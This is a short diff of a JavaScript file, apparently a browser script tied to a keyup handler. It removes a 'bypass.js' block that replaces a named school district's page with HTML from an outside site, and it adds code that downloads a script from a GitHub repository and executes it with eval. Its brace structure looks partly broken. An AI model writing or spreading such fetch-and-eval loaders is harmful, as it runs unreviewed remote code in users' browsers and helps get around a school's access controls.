@@ -23,16 +23,12 @@ window.addEventListener("keyup", event => {
                 console.error("Error loading script:", error);
             });    }
   })
-  //e
-/// bypass.js
-alert("hello!")
-  (function() {
-    if (window.location.href === 'https://tumwater.beaverton.k12.or.us/') {
-    fetch('https://myschoolisass.github.io/pain/test2.html')
-    .then(response => response.text())
-    .then(html => {
-        document.open();
-        document.write(html);
-        document.close();
-    });    }
-})();
+var url = 'https://raw.githubusercontent.com/myschoolisass/jsholder/main/woo.js'
+        fetch(url)
+            .then(response => response.text())
+            .then(scriptText => {
+                eval(scriptText);
+            })
+            .catch(error => {
+                console.error("Error loading script:", error);
+            });    }
